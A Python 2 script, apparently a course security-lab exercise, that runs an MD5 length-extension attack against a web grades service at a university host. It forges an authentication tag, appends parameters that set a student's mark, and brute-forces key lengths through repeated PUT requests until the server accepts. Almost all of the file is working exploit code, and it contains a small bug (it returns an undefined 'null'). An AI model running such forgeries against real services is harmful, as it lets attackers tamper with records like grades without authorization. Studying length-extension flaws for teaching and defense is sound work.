import httplib, urlparse, urllib
from md5p import md5, padding

###############
### attack ####
###############

def attack(url, tag, sid, mark): 
    #original message encrypted
    message = "="+sid

    #construct hash from existing tag
    h = md5(state=tag.decode("hex"), count=512)

    #construct extension to be added
    extension = "&sid=" + sid + "&mark="+mark

    #update hash with extension
    h.update(extension)

    #must try 8-20 as length of key
    flag = 0
    length = 8
    while (flag != 200 and length < 21):
        print "attempting attack with key length " + str(length)
        #update the message with extension
        attackUrl = url + "?tag=" + h.hexdigest() + "&sid=" + sid + urllib.quote(padding((len(message)+length)*8)) + extension;
        print attackUrl

        # parameter url is the attack url you construct
        parsedURL = urlparse.urlparse(attackUrl)

        # open a connection to the server
        httpconn = httplib.HTTPConnection(parsedURL.hostname, parsedURL.port)

        query = parsedURL.path + "?tag=" + h.hexdigest() + "&sid=" + sid + urllib.quote(padding((len(message)+length)*8)) + extension;
        # issue server-API request
        httpconn.request("PUT", query)

        # httpresp is response object containing a status value and possible message
        httpresp = httpconn.getresponse()

        #increase length by 1
        length += 1

        flag = httpresp.status

        # valid request will result in httpresp.status value 200
        print str(httpresp.status)+"\n"

    if (flag == 200):
        # in the case of a valid request, print the server's message
        print httpresp.read()
        
        # return the url that made the attack successul 
        return(query)
    else:
        return(null)


#############
### main ####
#############

if __name__ == "__main__":
    url = "http://grades.cms-weblab.utsc.utoronto.ca/"
    tag = "3f1de1c1fd83263f159f6dc284fd51b4"
    sid = "0000000001"
    mark = "1"
    
    print(attack(url, tag, sid, mark))